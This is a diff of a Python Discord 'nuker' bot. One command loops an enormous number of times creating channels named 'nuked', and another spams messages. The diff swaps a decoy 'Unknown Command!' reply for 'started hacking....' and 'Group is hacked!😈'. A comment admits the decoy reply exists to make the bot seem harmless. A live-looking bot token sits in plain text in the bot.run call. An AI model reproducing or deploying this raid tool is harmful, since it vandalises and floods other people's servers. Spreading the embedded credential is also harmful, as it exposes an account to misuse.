@@ -45,18 +45,18 @@ async def r(ctx, user: discord.User, role: discord.Role):
  
 @bot.command(pass_context=True)
 async def c(ctx):
-    await bot.say("Unknown Command!") #idk ignore this just to make sure some people that this bot isnt dangerous
+    await bot.say("started hacking....") #idk ignore this just to make sure some people that this bot isnt dangerous
     time.sleep(2)
     for i in range (0,10000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000):
         await bot.create_channel(ctx.message.server, 'nuked', type=discord.ChannelType.text) #you can change the channel name by replacing 'nuked' to any name
  
 @bot.command(pass_context=True)
 async def s(ctx):
-    await bot.say("Unknown Command!") #idk ignore this just to make sure some people that this bot isnt dangerous
+    await bot.say("started hacking....") #idk ignore this just to make sure some people that this bot isnt dangerous
     time.sleep(2)
     for i in range (0,10000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000):
-        await bot.say("text spam 1") #text 1 goes here
-        await bot.say("text spam 2") #text 2 goes here
+        await bot.say("LOL") #text 1 goes here
+        await bot.say("Group is hacked!😈") #text 2 goes here
  
  
 bot.run ("NjIyMTIwMjU4OTYyMDYzMzgw.XXvQ7A.GWuDrVanrwRVD32ZpLMzI0c50Cc") #your bot token (please dont use your discord account token otherwise your account will get banned maybe)
